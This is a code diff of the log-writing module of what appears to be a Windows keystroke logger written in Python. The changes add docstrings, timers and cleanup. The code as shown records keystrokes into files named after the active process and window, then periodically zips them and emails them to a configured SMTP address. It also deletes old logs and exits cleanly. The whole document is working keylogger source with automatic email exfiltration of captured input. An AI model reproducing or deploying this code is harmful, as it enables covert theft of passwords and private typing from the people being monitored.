@@ -3,10 +3,11 @@ import os, os.path
 import time
 import re
 import sys
-#from threading import Timer
+
+# needed for automatic timed recurring events
 import mytimer
 
-#the following are needed for zipping the logfiles
+# the following are needed for zipping the logfiles
 import zipfile
 import zlib
 
@@ -19,11 +20,11 @@ from email.Utils import COMMASPACE, formatdate
 from email import Encoders
 
 class LogWriter:
-
+    '''Manages the writing of log files and logfile maintenance activities.
+    '''
     def __init__(self, settings):
         
         self.settings = settings
-        
         self.settings['dirname'] = os.path.normpath(self.settings['dirname'])
         
         try:
@@ -49,15 +50,9 @@ class LogWriter:
                     self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
             except:
                 self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
-
-        # we only want to initalize the timer once, and then only AFTER we have some file opened to self.log
-        # so this will be our "one time use" flag
-        self.flushTimerInitialized = False 
         
-        #~ if not self.options.debug:      #if we are not running debug and thus can see console, let's redirect stderr to errorlog.
-            #~ self.errorlog = open(os.path.join(self.options.dirName, "errorlog.txt"), 'a')
-            #~ self.savestderr = sys.stderr    #save stderr just in case we want to restore it later
-            #~ sys.stderr = self.errorlog
+        # initialize self.log to None, so that we dont attempt to flush it until it exists
+        self.log = None
         
         # Set up the subset of keys that we are going to log
         self.asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
@@ -68,11 +63,23 @@ class LogWriter:
         if self.settings['parseescape'] == 'True':
             self.asciiSubset.remove(27)             #remove escape from allowed chars if needed
 
-        # initialize the automatic zip and email timer
-        self.emailtimer = mytimer.MyTimer(float(self.settings['emailinterval'])*60, 0, self.ZipAndEmailTimerAction)
-        self.emailtimer.start()
+        # initialize the automatic zip and email timer, if enabled in .ini
+        if self.settings['smtpsendemail'] == 'True':
+            self.emailtimer = mytimer.MyTimer(float(self.settings['emailinterval'])*60, 0, self.ZipAndEmailTimerAction)
+            self.emailtimer.start()
+        
+        # initialize automatic old log deletion timer
+        if self.settings['deleteoldlogs'] == 'True':
+            self.oldlogtimer = mytimer.MyTimer(float(self.settings['agecheckinterval'])*60*60, 0, self.DeleteOldLogs)
+            self.oldlogtimer.start()
+        
+        # initialize the automatic log flushing timer
+        self.flushtimer = mytimer.MyTimer(float(self.settings['flushinterval']), 0, self.FlushLogWriteBuffers, ["Flushing file write buffers due to timer\n"])
+        self.flushtimer.start()
 
     def WriteToLogFile(self, event):
+        '''Write keystroke specified in "event" object to logfile
+        '''
         loggable = self.TestForNoLog(event)     # see if the program is in the no-log list.
                 
         if not loggable:
@@ -82,12 +89,6 @@ class LogWriter:
         if self.settings['debug']: self.PrintDebug("loggable, lets log it\n")
         
         loggable = self.OpenLogFile(event) #will return true if log file has been opened without problems
-        
-        #start our autoflush timer, since a log file has been opened at this point, for the first time
-        if loggable and self.flushTimerInitialized == False:
-            self.flushTimerInitialized = True
-            self.flushtimer = mytimer.MyTimer(float(self.settings['flushinterval']), 0, self.FlushLogWriteBuffers)
-            self.flushtimer.start()
         
         if not loggable:
             self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
@@ -112,8 +113,7 @@ class LogWriter:
             self.PrintStuff('[KeyName:' + event.Key + ']')
 
         if event.Key == self.settings['flushkey']:
-            self.log.flush()
-            if self.settings['systemlog'] != 'None': self.systemlog.flush()
+            self.FlushLogWriteBuffers("Flushing write buffers due to keyboard command\n")
 
     def TestForNoLog(self, event):
         '''This function returns False if the process name associated with an event
@@ -126,19 +126,26 @@ class LogWriter:
                     return False
         return True
 
-    def FlushLogWriteBuffers(self):
-        self.PrintDebug("flushing file write buffer due to timer\n")
-        self.log.flush()
+    def FlushLogWriteBuffers(self, logstring=""):
+        '''Flush the output buffers and print a message to systemlog or stdout
+        '''
+        self.PrintDebug(logstring)
+        if self.log != None: self.log.flush()
         if self.settings['systemlog'] != 'None': self.systemlog.flush()
 
     def ZipLogFiles(self):
+        '''Create a zip archive of all files in the log directory.
+        '''
+        self.FlushLogWriteBuffers("Flushing write buffers prior to zipping the logs\n")
+        
         os.chdir(self.settings['dirname'])
         myzip = zipfile.ZipFile(self.settings['ziparchivename'], "w", zipfile.ZIP_DEFLATED)
+        
         for root, dirs, files in os.walk(os.curdir):
             for fname in files:
                 if fname != self.settings['ziparchivename']:
                     myzip.write(os.path.join(root,fname).split("\\",1)[1])
-    #            myzip.write(fname)
+        
         myzip.close()
         myzip = zipfile.ZipFile(self.settings['ziparchivename'], "r", zipfile.ZIP_DEFLATED)
         if myzip.testzip() != None:
@@ -146,12 +153,8 @@ class LogWriter:
         myzip.close()
         
     def SendZipByEmail(self):
-        
-        #def sendMail(to, fro, subject, text, files=[],server="localhost"):
-        #~ assert type(to)==list
-        #~ assert type(files)==list
-        #fro = "Expediteur <expediteur@mail.com>"
-
+        '''Send the zipped logfile archive by email, using mail settings specified in the .ini file
+        '''
         # set up the message
         msg = MIMEMultipart()
         msg['From'] = self.settings['smtpfrom']
@@ -181,14 +184,16 @@ class LogWriter:
         mysmtp.quit()
 
     def ZipAndEmailTimerAction(self):
+        '''This is a timer action function that zips the logs and sends them by email.
+        '''
         self.PrintDebug("Sending mail to " + self.settings['smtpto'] + "\n")
-        self.log.flush()
-        if self.settings['systemlog'] != 'None': self.systemlog.flush()
         self.ZipLogFiles()
         self.SendZipByEmail()
     
     def OpenLogFile(self, event):
-        
+        '''Open the appropriate log file, depending on event properties and settings in .ini file.
+        '''
+        # if the "onefile" option is set, we don't that much to do:
         if self.settings['onefile'] != 'None':
             if self.writeTarget == "":
                 self.writeTarget = os.path.join(os.path.normpath(self.settings['dirname']), os.path.normpath(self.settings['onefile']))
@@ -207,6 +212,7 @@ class LogWriter:
                 self.PrintDebug("writing to: " + self.writeTarget + "\n")
             return True
 
+        # if "onefile" is not set, we start playing with the logfilenames:
         subDirName = self.filter.sub(r'__',self.processName)      #our subdirname is the full path of the process owning the hwnd, filtered.
         
         WindowName = self.filter.sub(r'__',str(event.WindowName))
@@ -228,8 +234,9 @@ class LogWriter:
         #already-opened file.
         if self.writeTarget != os.path.join(self.settings['dirname'], subDirName, filename): 
             if self.writeTarget != "":
-                self.PrintDebug("flushing and closing old log\n")
-                self.log.flush()
+                self.FlushLogWriteBuffers("flushing and closing old log\n")
+                #~ self.PrintDebug("flushing and closing old log\n")
+                #~ self.log.flush()
                 self.log.close()
             self.writeTarget = os.path.join(self.settings['dirname'], subDirName, filename)
             self.PrintDebug("writeTarget:" + self.writeTarget + "\n")
@@ -261,19 +268,40 @@ class LogWriter:
         return True
 
     def PrintStuff(self, stuff):
+        '''Write stuff to log, or to debug outputs.
+        '''
         if not self.settings['debug']:
             self.log.write(stuff)
         else:
             self.PrintDebug(stuff)
 
     def PrintDebug(self, stuff):
+        '''Write stuff to console and/or systemlog.
+        '''
         if self.settings['debug']:
             sys.stdout.write(stuff)
         if self.settings['systemlog'] != 'None':
             self.systemlog.write(stuff)
 
+    def DeleteOldLogs(self):
+        '''Walk the log directory tree and remove any logfiles older than maxlogage (as set in .ini).
+        '''
+        self.PrintDebug("Analyzing and removing old logfiles.\n")
+        for root, dirs, files in os.walk(self.settings['dirname']):
+            for fname in files:
+                if time.time() - os.path.getmtime(os.path.join(root,fname)) > float(self.settings['maxlogage'])*24*60*60:
+                    try:
+                        os.remove(os.path.join(root,fname))
+                    except:
+                        self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
+                    try:
+                        os.rmdir(root)
+                    except:
+                        self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
+
     def GetProcessNameFromHwnd(self, hwnd):
-    
+        '''Acquire the process name from the window handle for use in the log filename.
+        '''
         threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
         
         # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
@@ -282,11 +310,20 @@ class LogWriter:
         procname = win32process.GetModuleFileNameEx(mypyproc, 0)
         return procname
 
+    def stop(self):
+        '''To exit cleanly, flush all write buffers, and stop all running timers.
+        '''
+        self.FlushLogWriteBuffers("Flushing buffers prior to exiting")
+        self.flushtimer.cancel()
+        if self.settings['smtpsendemail'] == 'True':
+            self.emailtimer.cancel()
+        if self.settings['deleteoldlogs'] == 'True':
+            self.oldlogtimer.cancel()
 
 if __name__ == '__main__':
     #some testing code
     #put a real existing hwnd into event.Window to run test
-    #this testing code is now really outdated.
+    #this testing code is now really outdated and useless.
     lw = LogWriter()
     class Blank:
         pass
